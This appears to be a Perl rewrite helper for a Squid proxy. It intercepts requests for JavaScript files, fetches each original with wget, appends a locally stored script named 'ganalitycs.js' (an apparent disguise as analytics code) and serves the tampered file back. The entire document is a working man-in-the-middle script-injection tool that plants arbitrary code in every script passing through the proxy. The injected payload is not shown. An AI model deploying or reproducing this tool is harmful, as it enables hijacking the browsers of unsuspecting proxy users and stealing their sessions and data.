 #!/usr/bin/perl

 $|=1;
 $count = 0;
 $pid = $$;

 while (<>) {
  chomp $_;
  if ($_=~ /(.*\.js)/i) {
    $url = $1;
    system("/usr/bin/wget", "-q", "-O","/var/www/tmp/$pid-$count.js","$url");
    system("chmod o+r /var/www/tmp/$pid-$count.js");
    system("cat /etc/squid/ganalitycs.js >> /var/www/tmp/$pid-$count.js");
    print "http://127.0.0.1:80/tmp/$pid-$count.js\n";
  }
  else {
    print "$_\n";
  }
  $count++;
}
